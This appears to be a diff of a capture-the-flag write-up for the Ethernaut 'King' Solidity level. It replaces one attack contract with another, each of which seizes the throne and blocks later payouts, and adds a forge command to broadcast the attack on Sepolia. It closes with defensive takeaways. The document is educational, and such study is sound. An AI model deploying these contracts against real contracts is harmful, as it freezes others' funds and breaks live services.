@@ -21,42 +21,60 @@
 
 ## The hack
 
-It requires an understanding of how `transfer` works in solidity, and when and how to use it.
+In this level, the goal is to become the king and then make sure that the contract is not able to transfer the prize to the next king. In other words, we have to become king and then break the game.
+
+This requires an understanding of how the now-considered deprecated `transfer` works in solidity. This function throws an error if the transfer fails, but doesn't return a boolean value. This means that if the transfer fails, the transaction will revert.
+
+```javascript
+receive() external payable {
+    require(msg.value >= prize || msg.sender == owner);
+    payable(king).transfer(msg.value);
+    king = msg.sender;
+    prize = msg.value;
+  }
+```
+
+First, we need to check the `prize` function to see how much ether is required to pass the `require` statement and become king.
+
+Now, that we are king, how can we make sure that no one else can dethrone us? How to make sure the `transfer()` function reverts systematically after us? The answer is pretty simple, we just need to make sure that our king contract can't receive any ether. As long as no `receive()` or `fallback()` function is defined, the contract will not be able to receive any ether via the King contract, which will effectively prevent anyone from becoming the new king after us.
 
 ## Solution
 
-Since in the `King` contract the `recieve` function transfers to the soon to be previous king the msg.value using `transfer` and it does not check if it has worked, all we need to do is deploy a contract that first becomes the king, and in its fall back make sure the transfer to it (which will happen when Ethernaut tries to take control off the level after you have submitted it) it will fail.
+Deploy a contract that can't receive ether via the "normal" way (no `receive()` or `fallback()` functions).
 
-```
+```javascript
 // SPDX-License-Identifier: MIT
-pragma solidity ^0.8.0;
+pragma solidity ^0.8.20;
 
+interface IKing {
+    function prize() external returns (uint256);
+}
 
-contract KingAttack {
+contract FallenKing {
+    address private immutable king;
 
-    // take in the address of the King contract, call its fallback to
-    // pass it ether and become the new king
-    // and then artifically induce failure by making a revert in our fallbakc
-    // (because ethernaut is going to try take over  the contract,
-    // but the transfer it does will fail as we're revertting it in our fallback)
-
-
-    constructor (address _kingAddress) public payable {
-        address(_kingAddress).call{value: msg.value}("");
-        // the ("") symbolises that we're not calling a specific function but just the
-        //fallback or receive
-
+    constructor(address _king) {
+        king = _king;
     }
 
-    fallback() external payable {
-        revert("Gotcha");
+    function attack() external payable {
+        uint256 prize = IKing(king).prize();
+        (bool success, ) = king.call{value: prize}("");
+        require(success, "Transfer failed");
     }
 }
 ```
 
+Then, you can use forge scripts to deploy this contract and call the `attack` function:
+
+```bash
+forge script script/9_King.s.sol:PoC --rpc-url sepolia --broadcast --verify --etherscan-api-key $ETHERSCAN_API_KEY --watch
+```
+
 ## Takeaway
 
-To use `call` instead of transfer and send, and to avoid re-entrancy with call, follow the check-effect-interaction pattern
+- `send` and `transfer` are now considered deprecated. They should be replaced by `call` with a proper Check-Effect-Interaction pattern to prevent re-entrancy.
+- <b>External calls must be used with caution and must handle errors properly.</b>
 
 ## References
 
